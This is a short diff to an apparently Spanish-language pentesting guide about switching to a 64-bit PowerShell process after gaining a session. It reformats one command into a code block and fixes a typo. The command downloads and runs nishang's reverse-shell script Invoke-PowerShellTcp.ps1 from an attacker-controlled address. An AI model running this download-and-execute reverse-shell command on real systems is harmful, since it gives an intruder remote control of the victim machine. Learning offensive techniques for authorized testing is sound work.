@@ -1589,7 +1589,9 @@ El saber con qué aquitectura estamos tratando tanto del sistema operativo como 
 
 Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:
 
-`C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')`
+```bash
+C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')
+```
 
-Compartiendo el recurso sitado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.
+Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.
 
